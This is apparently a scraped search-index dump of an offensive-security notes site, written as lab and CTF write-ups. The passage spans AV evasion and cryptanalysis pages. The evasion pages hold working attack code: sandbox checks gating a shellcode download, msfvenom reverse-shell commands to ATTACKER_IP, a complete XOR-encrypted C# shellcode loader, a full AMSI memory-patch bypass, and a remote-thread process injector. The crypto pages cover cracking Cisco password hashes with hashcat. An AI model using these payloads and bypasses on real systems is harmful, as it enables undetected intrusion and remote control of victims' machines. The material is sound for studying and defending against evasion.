System Memory is greater than 5.00GB if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) { return TRUE; } else { return FALSE; } } int main() { // Evaluates if the installed RAM amount is greater than 5.00 GB, //if true download Shellcode, if false, exit the program. if (memoryCheck() == TRUE) { downloadAndExecute(); } else { exit; } return 0; } Compile and upload the code to Any.Run : with the Memory Check function without the Memory Check function In the first submission, our memory check function works without any issue and gracefully exits the program when it notices the device has less than 5GB of RAM. The code functions as intended. Querying Network Information  Querying information about the Active Directory domain can be kept simple by querying the name of a Domain Controller using the NetGetDCName Windows API. BOOL isDomainController(){ // Create a long pointer to Wide String for our DC Name to live in LPCWSTR dcName; // Query the NetGetDCName Win32 API for the Domain Controller Name NetGetDCName(NULL, NULL, (LPBYTE *) &dcName); // Convert the DCName from a Wide String to a String wstring ws(dcName); string dcNewName(ws.begin(), ws.end()); // Search if the UNC path is referenced in the dcNewName variable. If so, there is likely a Domain Controller present in the environment. If this is true, pass the check, else, fail. if ( dcNewName.find(\"\\\\\\\\\"){ return TRUE; } else { return FALSE; } } int main() { if (isDomainController == TRUE) { downloadAndExecute(); } else { cout << \"Domain Controller Not Found!\"; } } Compile and upload to VirusTotal: Looking at the results of the SysInternals Sandbox, we can see that the Sandbox evasion technique worked. No outbound request to Cloudflare was made. Adding External Dependencies in Visual Studio  To add a new DLL to the project file, Open project, right-click on the Project name in the “Solution Explorer”. Click Properties at the bottom of the list; this will open a new view. Expand the “Linker” tab and select the “Input” submenu. Add the Netapi32 Library.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b82b445aebeb2910740eaaa8386de73b",
    "u": "https://evasion.tymyrddin.dev/docs/signature/code-based",
    "t": "Static code-based signatures ",
    "c": "Static code-based signatures  The Layered Obfuscation Taxonomy covers the most reliable solutions as part of the Obfuscating Methods and Obfuscating Classes layer. The techniques class splitting/coalescing and method scattering/aggregation can be grouped into an overarching concept of splitting or merging any given OOP (Object-Oriented Programming) function. Other techniques such as dropping modifiers or method clone can be grouped into an overarching concept of removing or obscuring identifiable information. Splitting and merging objects  The methodology required to split or merge objects is very similar to the objective of concatenation: Create a new object function that can break the signature while maintaining the previous functionality. As an example, in Using Custom Covenant Listener Profiles & Grunt Templates to Elude AV a string is replaced with a call to a new object (class) splitting the message. The original offending string: string MessageFormat = @\"{{\"\"GUID\"\":\"\"{0}\"\",\"\"Type\"\":{1},\"\"Meta\"\":\"\"{2},\"\"IV\"\":\"\"{3}\"\",\"\"EncryptedMessage\"\":\"\"{4}\"\",\"\"HMAC\"\":\"\"{5}\"\"}}\"; Obfuscated Method: The new class used to replace and concatenate the string. public static string GetMessageFormat // Format the public method { get // Return the property value { var sb = new StringBuilder(@\"{{\"\"GUID\"\":\"\"{0}\"\",\"); // Start the built-in concatenation method sb.Append(@\"\"\"Type\"\":{1},\"); // Append substrings onto the string sb.Append(@\"\"\"Meta\"\":\"\"{2}\"\",\"); sb.Append(@\"\"\"IV\"\":\"\"{3}\"\",\"); sb.Append(@\"\"\"EncryptedMessage\"\":\"\"{4}\"\",\"); sb.Append(@\"\"\"HMAC\"\":\"\"{5}\"\"}}\"); return sb.ToString(); // Return the concatenated string to the class } } string MessageFormat = GetMessageFormat Removing and obscuring identifiable information  Applying removing identifiable information to identified signatures in any objects including methods and classes. An example of this can be found in Mimikatz where an alert is generated for the string wdigest.dl l. This can be solved by replacing the string with any random identifier changed throughout all instances of the string. This can be categorised in the obfuscation taxonomy under the method proxy technique . Lab  Obfuscate the following PowerShell snippet, using AmsiTrigger to check signatures. Once sufficiently obfuscated, submit the snippet to the webserver at http://IP address/challenge-1.html . The file name must be saved as challenge-1.ps1 . If correctly obfuscated a flag will appear in an alert pop-up. $MethodDefinition = \" [DllImport(`\"kernel32`\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(`\"kernel32`\")] public static extern IntPtr GetModuleHandle(string lpModuleName); [DllImport(`\"kernel32`\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); \"; $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru; $A = \"AmsiScanBuffer\" $handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll'); [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A); [UInt32]$Size = 0x5; [UInt32]$ProtectFlag = 0x40; [UInt32]$OldProtectFlag = 0; [Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag); $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6); Obfuscated code  $MethodDefinition = @' [DllImport(\"kernel32\", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)] public static extern IntPtr GetProcAddress(IntPtr hModule,string procName); [DllImport(\"kernel32.dll\", CharSet=CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lpModuleName); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); '@ $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru; $ASBD = \"AmsiS\"+\"canBuffer\" $handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll'); [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ASBD); [UInt32]$Size = 0x5; [UInt32]$ProtectFlag = 0x40; [UInt32]$OldProtectFlag = 0; [Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag); $buf = new-object byte [] 6 $buf[0] = [UInt32]0xB8 $buf[1] = [UInt32]0x57 $buf[2] = [UInt32]0x00 $buf[3] = [Uint32]0x07 $buf[4] = [Uint32]0x80 $buf[5] = [Uint32]0xC3 [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6); DEFCON-27-Workshop-Anthony-Rose-Introduction-to-AMSI-Bypasses-and-Sandbox-Evasion-Notes.pdf : This method works by using C# to expose the native API calls in Kernel32 to powershell. This allows us to obtain where in memory the AMSI Scan buffer is and patch in a command to return a good scan result prior to the function actually scanning our commands. It does not cause AMSI to fail instead preserving the appearance of the scan being completed fully. APTs have been observed using this technique in the wild . And flag!",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "36f53a1502d08c2c941fe58f63675dd3",
    "u": "https://evasion.tymyrddin.dev/docs/av/enc",
    "t": "Encoding and encrypting shellcode ",
    "c": "Encoding and encrypting shellcode  Tools such as Metasploit provide encoding and encryption features. However, AV vendors are aware of the way these tools build their payloads and take measures to detect them. If you try using such features out of the box, chances are your payload will be detected as soon as the file touches the victim’s disk. Metasploit encoding  Listing encoders within the Metasploit framework: $ msfvenom --list encoders | grep excellent Encoding using Shikata_ga_nai $ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\\x00' -i 3 -f csharp It gets flagged by the AV. Try encrypting the payload. Intuitively, we would expect this to have a higher success rating, as decrypting the payload should prove a harder task for the AV. Metasploit encryption  Listing encryption modules within the Metasploit framework: $ msfvenom --list encrypt Xoring shellcode using the Metasploit framework: $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key \"MyZekr3tKey***\" -o xored-revshell.exe It still gets flagged by the AV. Creating a Custom Payload  The best way to overcome this is to use a custom encoding schemes so that the AV doesn’t know what to do to analyse the payload. It does not have to be anything too complex, as long as it is confusing enough for the AV to analyse. Take a simple reverse shell generated by msfvenom and use a combination of XOR and Base64 to bypass Defender. Generate a CSharp shellcode format: $ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp Encrypter.cs (replace the buf variable with the shellcode generated with msfvenom): using System; using System.Collections.Generic; using System.Linq; using System.Text; using System.Threading.Tasks; namespace Encrypter { internal class Program { private static byte[] xor(byte[] shell, byte[] KeyBytes) { for (int i = 0; i < shell.Length; i++) { shell[i] ^= KeyBytes[i % KeyBytes.Length]; } return shell; } static void Main(string[] args) { //XOR Key - It has to be the same in the Dropper for Decrypting string key = \"MwahK3y666!\"; //Convert Key into bytes byte[] keyBytes = Encoding.ASCII.GetBytes(key); //Original Shellcode here (csharp format) byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 }; //XORing byte by byte and saving into a new array of bytes byte[] encoded = xor(buf, keyBytes); Console.WriteLine(Convert.ToBase64String(encoded)); } } } Compile and execute on the Windows machine: C:\\> csc.exe Encrypter.cs C:\\> .\\Encrypter.exe qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE= To match the encoder, decode everything in the reverse order. Start by decoding the base64 content and then continue by XOR ing the result with the same key used in the encoder. EncStageless.cs : using System; using System.Net; using System.Text; using System.Runtime.InteropServices; public class Program { [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; private static byte[] xor(byte[] shell, byte[] KeyBytes) { for (int i = 0; i < shell.Length; i++) { shell[i] ^= KeyBytes[i % KeyBytes.Length]; } return shell; } public static void Main() { string dataBS64 = \"qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=\"; byte[] data = Convert.FromBase64String(dataBS64); string key = \"MwahK3y666!\"; //Convert Key into bytes byte[] keyBytes = Encoding.ASCII.GetBytes(key); byte[] encoded = xor(data, keyBytes); UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length); IntPtr threadHandle = IntPtr.Zero; UInt32 threadId = 0; IntPtr parameter = IntPtr.Zero; threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId); WaitForSingleObject(threadHandle, 0xFFFFFFFF); } } Compile the payload on the Windows machine: C:\\> csc.exe EncStageless.cs Before running the payload, set up an nc listener on the attack machine: $ nc -lvp 443",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b40e43930d680da74618aede84d850e2",
    "u": "https://evasion.tymyrddin.dev/docs/runtime/patching",
    "t": "Patching AMSI ",
    "c": "Patching AMSI  AMSI is primarily instrumented and loaded from amsi.dll . This dll can be abused and forced to point to a specific response code. The AmsiScanBuffer function provides the hooks and functionality necessary to access the pointer/buffer for the response code. AmsiScanBuffer is vulnerable because amsi.dll is loaded into the PowerShell process at startup. It will scan a “buffer” of suspected code and report it to amsi.dll to determine the response. This function can be controlled to overwrite the buffer with a clean return code. At a high-level AMSI patching can be broken up into four steps: Obtain handle of amsi.dll Get process address of AmsiScanBuffer Modify memory protections of AmsiScanBuffer Write opcodes to AmsiScanBuffer Code  Load GetProcAddress, GetModuleHandle, and VirtualProtect from kernel32 using p/invoke: [DllImport(`\"kernel32`\")] // Import DLL where API call is stored public static extern IntPtr GetProcAddress( // API Call to import IntPtr hModule, // Handle to DLL module string procName // function or variable to obtain ); [DllImport(`\"kernel32`\")] public static extern IntPtr GetModuleHandle( string lpModuleName // Module to obtain handle ); [DllImport(`\"kernel32`\")] public static extern bool VirtualProtect( IntPtr lpAddress, // Address of region to modify UIntPtr dwSize, // Size of region uint flNewProtect, // Memory protection options out uint lpflOldProtect // Pointer to store previous protection options ); Load the API calls using Add-Type . This cmdlet will load the functions with a proper type and namespace that will allow the functions to be called. $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru; Identify the process handle of AMSI using GetModuleHandle . The handle will then be used to identify the process address of AmsiScanBuffer using GetProcAddress : $handle = [Win32.Kernel32]::GetModuleHandle( 'amsi.dll' // Obtains handle to amsi.dll ); [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress( $handle, // Handle of amsi.dll 'AmsiScanBuffer' // API call to obtain ); Modify the memory protection of the AmsiScanBuffer process region. Specify parameters and the buffer address for VirtualProtect : [UInt32]$Size = 0x5; // Size of region [UInt32]$ProtectFlag = 0x40; // PAGE_EXECUTE_READWRITE [UInt32]$OldProtectFlag = 0; // Arbitrary value to store options [Win32.Kernel32]::VirtualProtect( $BufferAddress, // Point to AmsiScanBuffer $Size, // Size of region $ProtectFlag, // Enables R or RW access to region [Ref]$OldProtectFlag // Pointer to store old options ); Specify what to overwrite the buffer with: $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); [system.runtime.interopservices.marshal]::copy( $buf, // Opcodes/array to write 0, // Where to start copying in source array $BufferAddress, // Where to write (AsmiScanBuffer) 6 // Number of elements/opcodes to write ); Resources  The Rise and Fall of AMSI - Black Hat Briefings Rasta Mouse: Memory Patching AMSI Bypass rasta-mouse/AmsiScanBufferBypass Marshal.Copy Method Platform Invoke (P/Invoke) GetProcAddress GetModuleHandle VirtualProtect",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "90d77adea544d76c50f0aec1f593d768",
    "u": "https://evasion.tymyrddin.dev/docs/signature/behavioural",
    "t": "Behavioural signatures ",
    "c": "Behavioural signatures  Obfuscating functions and properties can achieve a lot with minimal modification. Even after breaking static signatures attached to a file, modern engines may still observe the behavior and functionality of the binary. This presents problems for attackers that cannot be solved with simple obfuscation. Modern antivirus engines will employ two common methods to detect behaviour: observing imports and hooking known malicious calls. While imports can be easily obfuscated or modified with minimal requirements, hooking requires complex techniques. Lab  Obfuscate the following C snippet, ensuring no suspicious API calls are present in the IAT: #include <windows.h> #include <stdio.h> #include <lm.h> int main() { printf(\"GetComputerNameA: 0x%p\\\\n\", GetComputerNameA); CHAR hostName[260]; DWORD hostNameLength = 260; if (GetComputerNameA(hostName, &hostNameLength)) { printf(\"hostname: %s\\\\n\", hostName); } } Obfuscated code  Define the structure of the call Obtain the handle of the module the call address is present in Obtain the process address of the call #include <windows.h> #include <stdio.h> #include <lm.h> // Define the structure of the call typedef BOOL (WINAPI* myNotGetComputerNameA)( LPSTR lpBuffer, LPDWORD nSize ); int main() { // Obtain the handle of the module the call address is present in HMODULE hkernel32 = LoadLibraryA(\"kernel32.dll\"); // Obtain the process address of the call myNotGetComputerNameA notGetComputerNameA = (myNotGetComputerNameA) GetProcAddress(hkernel32, \"GetComputerNameA\"); printf(\"GetComputerNameA: 0x%p\\\\n\", GetComputerNameA); CHAR hostName[260]; DWORD hostNameLength = 260; if (GetComputerNameA(hostName, &hostNameLength)) { printf(\"hostname: %s\\\\n\", hostName); } } Flag. Resources  The difference between signature-based and behavioural detections The Journey of Evasion Enters Behavioural Phase",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "aeda46484d6474e8d8e5406158b05c8a",
    "u": "https://evasion.tymyrddin.dev/docs/injection/shell",
    "t": "Shellcode injection ",
    "c": "Shellcode injection  Shellcode injection is the most basic form of process injection. Overview  How Windows API calls interact with process memory. Open a target process with all access rights ( OpenProcess ). Allocate target process memory for the shellcode ( VirtualAllocEx ). Write shellcode to allocated memory in the target process ( WriteProcessMemory ). Execute the shellcode using a remote thread ( CreateRemoteThread ). C++ Code  Open the target process supplied via the command-line: processHandle = OpenProcess( PROCESS_ALL_ACCESS, // Defines access rights FALSE, // Target handle will not be inhereted DWORD(atoi(argv[1])) // Local process supplied by command-line arguments ); Allocate memory to the byte size of the shellcode: remoteBuffer = VirtualAllocEx( processHandle, // Opened target process NULL, sizeof shellcode, // Region size of memory allocation (MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages ); Use the allocated memory region to write our shellcode to memory regions: WriteProcessMemory( processHandle, // Opened target process remoteBuffer, // Allocated memory region shellcode, // Data to write sizeof shellcode, // byte size of data NULL ); Execute the shellcode residing in memory: remoteThread = CreateRemoteThread( processHandle, // Opened target process NULL, 0, // Default size of the stack (LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread NULL, 0, // Ran immediately after creation NULL ); Compile to create a basic process injector ( shellcode-injector.exe ). Injection  On the target machine, start up Powershell, and identify a PID of a process running as THM-Attacker to target (using Details tab of TaskManager). I chose the PID of the Powershell. PS C:\\Users\\THM-Attacker> cd .\\Desktop\\ PS C:\\Users\\THM-Attacker\\Desktop> cd .\\Injectors\\ PS C:\\Users\\THM-Attacker\\Desktop\\Injectors> .\\shellcode-injector.exe PID Flag! Resources  MITRE: process injection",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "dfdf5babc2897006058def26a0c445e9",
    "u": "https://evasion.tymyrddin.dev/docs/av/staged",
    "t": "Staged vs stageless payloads ",
    "c": "Staged vs stageless payloads  A stageless payload embeds the final shellcode directly into itself, like a packaged app that executes the shellcode in a single-step process. Staged payloads work by using intermediary shellcodes that act as steps leading to the execution of a final shellcode. Each of these intermediary shellcodes is known as a stager, and its primary goal is to provide a means to retrieve the final shellcode and execute it eventually. There are payloads with several stages, but the usual case involves having a two-stage payload where the first stage, stage0 , is a stub shellcode that will connect back to the attacker’s machine to download the final shellcode to be executed. Once retrieved, the stage0 stub will inject the final shellcode somewhere in the memory of the payload’s process and execute it. Advantages of stageless payloads: The resulting executable packs all that is needed to get our shellcode working. The payload will execute without requiring additional network connections. The fewer the network interactions, the lesser your chances of being detected by an IPS. If you are attacking a host with very restricted network connectivity, you may want your whole payload to be in a single package. Advantages of staged payloads: Small footprint on disk. Since stage0 is only in charge of downloading the final shellcode, it will most likely be small in size. The final shellcode isn’t embedded into the executable. If your payload is captured, the Blue Team will only have access to the stage0 stub and nothing more. The final shellcode is loaded in memory and never touches the disk. This makes it less prone to be detected by AV solutions. You can reuse the same stage0 dropper for many shellcodes, as you can simply replace the final shellcode that gets served to the victim machine.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "0b20292403c32ed8d0e21c4ce5b30cd1",
    "u": "https://cryptanalysis.tymyrddin.dev/",
    "t": "Beyond the readable ",
    "c": "Beyond the readable  Come backstage with us to discover what is usually not seen concerning encoded and encrypted data in rest, underway, and in use. Witness the strategic decisions, the designing of algorithms, the complex implementations, the innovative (yet old and not really changing) technological solutions, the endless resources invested into research and development of security and privacy … and everything that isn’t, and everything that is, but gets hacked. Testlab Cryptanalysis tools Notes on techniques Introduction Classical ciphers Brute force Attack models Security goals Block ciphers AES busting Down streams Hacking hashes RSA puzzling Diffie-Hellman Elliptic curve balls Coding classical ciphers Introduction Caesar's cipher Vigenere's cipher Columnar transposition cipher Rail fence transposition cipher Coding modern ciphers Introduction AES: A symmetric block cipher LFSR: Linear feedback shift registers RSA: An asymmetric key exchange Classical cipher breaking Introduction Mono-alphabetic substitution: Caesar Poly-alphabetic substitution: Vigenère Transposition: Rail Fence Mono-alphabetic substitution: Polybe GEDEFU Enigma machine Poly-alphabetic substitution: One Time Pad AES busting Introduction CBC Bit-flipping attack AES Electronic code book Initialisation vector AES 4 rounds AES128 Counter mode attack AES Fault attack #1 CBC padding attack Side channel AES: CPA Side channel AES: first round AES Weaker variant AES Fault attack #2 AES PMAC forgery attack Down streams Introduction LFSR - Known plaintext Hash hacking Introduction DCC Hash DCC2 Hash LM Hash Message Digest 5 NT Hash SHA-2 Hash CISCO Salted Password Hash length extension attack SHA-3 Hash RSA puzzling Introduction RSA Factorisation RSA Decipher oracle RSA Corrupted key: Private exponent RSA Continued fractions RSA Common modulus RSA Padding RSA Signature RSA Corrupted key 2 RSA Corrupted key 3 RSA Multiple recipients RSA Lee cooper Data dares Introduction ELF64 PID encryption Protected PKZIP file Known plaintext XOR File: Insecure storage Mozilla Firefox 14 Android lock pattern Diffie-Hellman Introduction Elliptic curve balls Introduction Discrete logarithm problem ECDHE ECDSA: Conventional attack ECDSA: Implementation error Books ",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "0e4eae5f2902febfb879b616f420af51",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/aes/ecb",
    "t": "AES Electronic code book ",
    "c": "AES Electronic code book  RootMe Challenge: AES-ECB : Find the password in this file and use it to validate the challenge. The given ch25.zip attachment contains a file called mylogin.cnf . The .mylogin.cnf file generated by mysql_config_editor does not securely store the password used to log in to the database. It just obfuscates it. The format of the file: 4 Bytes Zero (Version Information) 20 Bytes Key Generation Matter Repeated: 4 Bytes Length information Length bytes crypted matter. The crypt is done using the AES ENCRYPT function , which in itself is insecure: It is an aes-128-ecb with a NULL IV. The key used by AES 128 needs to be CHAR(16) , but the function accepts any string as a key generation matter. It generates the key from the key generation matter by XORing the key generation matter onto itself in a 16 byte loop, starting with a buffer of NULL bytes. [safelogin] user = root password = xxxxxxxxxx host = localhost",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a611a42fc1e31c16a141ff0a660a8018",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/hashes/cisco",
    "t": "CISCO Salted Password ",
    "c": "CISCO Salted Password  Your company’s network administrator forgot his administration passwords. He does however have a backup of his startup-config file . Use it to recover his passwords! The flag is the concatenation of the enable and administrator passwords. {! version 15.1 no service timestamps log datetime msec no service timestamps debug datetime msec no service password-encryption ! hostname R1 ! enable secret 5 $1$mERr$A419.HL58lq743wXS4kSM1 ! ip cef no ipv6 cef ! username administrator secret 5 $1$mERr$yhf7f2RnC74CxKANvoekD. ! license udi pid CISCO2911/K9 sn FTX1524V4VG- ! no ip domain-lookup ! spanning-tree mode pvst ! interface GigabitEthernet0/0 ip address 10.0.0.254 255.255.255.0 no ip proxy-arp duplex auto speed auto ! interface GigabitEthernet0/1 ip address 11.0.0.1 255.255.255.252 no ip proxy-arp duplex auto speed auto ! interface GigabitEthernet0/2 no ip address duplex auto speed auto shutdown ! interface Vlan1 no ip address shutdown ! router bgp 1 bgp router-id 1.1.1.1 bgp log-neighbor-changes no synchronization neighbor 11.0.0.2 remote-as 2 network 10.0.0.0 mask 255.255.255.0 ! ip classless ! ip flow-export version 9 ! no cdp run ! line con 0 login local ! line aux 0 ! line vty 0 4 login ! ! ! } The file contains a Cisco administrator secret 5 password username administrator secret 5 $1$mERr$yhf7f2RnC74CxKANvoekD. . Also needed to get the flag is the enable secret 5 password: enable secret 5 $1$mERr$A419.HL58lq743wXS4kSM1 . Structure: $1$mERr$A419.HL58lq743wXS4kSM1 ^ ^ ^ | | | | | `-> Hash (salt + password) | | | `-> base64 salt (4 chars.) | `-> Hash type (md5) On cracking with hashcat or John the Ripper: Cisco Crackability John the Ripper Hashcat Type 0 instant n/a n/a Type 7 instant n/a n/a Type 4 easy --format=Raw-SHA256 -m 5700 Type 5 medium --format=md5crypt -m 500 Type 8 hard --format=pbkdf2-hmac-sha256 -m 9200 Type 9 very hard --format=scrypt -m 9300 Cracking the administrator password: hash.txt : administrator:$1$mERr$yhf7f2RnC74CxKANvoekD. Using hashcat : hashcat -m 500 --username -O -a 0 hash.txt /usr/share/wordlists/rockyou.txt Cracking the enable password: hash.txt : $1$mERr$A419.HL58lq743wXS4kSM1 Using hashcat : hashcat -m 500 -O -a 0 hash.txt /usr/share/wordlists/rockyou.txt I also tried IFM , just to see it work: It was extremely slow, and I broke it off after an hour. The flag is the concatenation of the enable and administrator passwords, in that order. Resources  Cisco Password Cracking and Decrypting Guide",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "515ff4024793f53dbe0e739573e8a7fd",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/ecc/ecdsa-error",
    "t": "ECDSA: Implementation error ",
    "c": "ECDSA: Implementation error  RootMe Challenge: ECDSA - Implementation error : The goal is to read the contents of the .passwd file by exploiting a memory corruption in this implementation of ECDSA. Note: This is a remote service. Resources  The Insecurity of The Elliptic Curve Digital Signature Algorithm with Partially Known Nonces - Nguyen, Shparlinski",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "06f871379eb9d6c349bafee4bf9b3350",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/rsa/factorisation",
    "t": "RSA Factorisation ",
    "c": "RSA Factorisation  RootMe Challenge: Decrypt the password : The validation password was encrypted using this public key. ciphertext : e8oQDihsmkvjT3sZe+EE8lwNvBEsFegYF6+OOFOiR6gMtMZxxba/bIgLUD8pV3yEf0gOOfHuB5bC3vQmo7bE4PcIKfpFGZBA Decode the base64 ciphertext Use RsaCtfTool Decrypt message with openssl Resources  Cryptanalysis of short RSA secret exponents DROWN: Breaking TLS using SSLv2 Chosen ciphertext attacks against protocols based on the RSA encryption standard - Daniel Bleichenbacher Continued Fractions",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a5f3e6174ea3d4bdddb82cea674e07ea",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/streams/lfsr",
    "t": "LFSR - Known plaintext ",
    "c": "LFSR - Known plaintext  RootMe: LFSR - Known plaintext : One of your friends argues that stream ciphers are safer than ever. You smile and tell him he is not right. Upset, he challenges you by sending you an encrypted file. Show him he’s wrong! The file he sent is named challenge.png.encrypt . Apparently it is a .png . The 8 header bytes and 8 IDHR bytes always contain the following hex values: '89504e470d0a1a0a0000000d49484452' . A 16 byte plaintext. Get the script. 16 bytes of ciphertext. XOR the plaintext with the first 16 bytes from challenge.png.encrypt and put in comma separated list format: [1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0] Use that in berlekamp_massey.py Minimal LFSR: 16 Minimal polynomial: [1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1] This is the polynomial \\(X^16 + X^15 + X^13 + X^5 + 1\\) Use pylfsr to create an LFSR algorithm, and XOR each encrypted byte with LFSR output to decode the cipher and create an image challenge.png . Get the password from the image.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1792ada668577ffc6c703aa0ced14c34",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/hashes/md5",
    "t": "Message Digest 5 ",
    "c": "Message Digest 5  By the mid-1990s, weaknesses were revealed in MD5 ’s compression functions that could lead to collisions, and 10 years later successful attacks on MD5 were being conducted. MD5 has been cryptographically broken and is considered insecure. Crack the given hash : 7ecc19e1a0be36ba2c6f05d06b5d3058 Use the crackstation .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "9bb1f51ab4b17654c12fb9ef4d28bd81",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/rsa/oracle",
    "t": "RSA Decipher oracle ",
    "c": "RSA Decipher oracle  RootMe Challenge: Darkness cannot drive out darkness; only light can do that : You have sucessfully intercepted a C text, encrypted with a RSA keypair which you know the (n, e) public component. Luckily, your victim has made a mistake by using a server that allows you to decrypt any ciphered text with his public key, except for those including a secret that must stay encrypted. Your job is to handle it in order to decrypt this weird message! n = 456378902858290907415273676326459758501863587455889046415299414290812776158851091008643992243505529957417209835882169153356466939122622249355759661863573516345589069208441886191855002128064647429111920432377907516007825359999 e = 65537 c = 41662410494900335978865720133929900027297481493143223026704112339997247425350599249812554512606167456298217619549359408254657263874918458518753744624966096201608819511858664268685529336163181156329400702800322067190861310616 Calculate the ciphertext Encrypt a message Enter the resulting ciphertext to be decrypted Copy the resulting plaintext and use it to decrypt \\(n\\) Resources  Chosen ciphertext attacks against protocols based on the RSA encryption standard - Daniel Bleichenbacher A new and optimal chosen-message attack on RSA-type cryptosystems",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "bf3fea5e606320188bab7276f40c4b08",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/ecc/discrete-log",
    "t": "Discrete logarithm problem ",
    "c": "Discrete logarithm problem  RootMe challenge: Discrete logarithm problem : What a pretty equation. Alice and Bob use the Discrete Logarithm Problem in order to find securely a common session key. You have found Alice’s public key \\((g, y, p)\\) , Now you have to find the private one x as : \\(y = g^x \\mod p\\) For information, \\(p\\) is a prime number of 522 bits length and \\(g\\) is a primitive root modulo \\(p\\) . For validating this challenge, you just have to input the value of x (also 522 bits wide). p = 7863166752583943287208453249445887802885958578827520225154826621191353388988908983484279021978114049838254701703424499688950361788140197906625796305008451719 y = 6289736695712027841545587266292164172813699099085672937550442102159309081155467550411414088175729823598108452032137447608687929628597035278365152781494883808 g = 2862392356922936880157505726961027620297475166595443090826668842052108260396755078180089295033677131286733784955854335672518017968622162153227778875458650593",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "607e8ab1d0a0411ae7dd076ab2d72682",
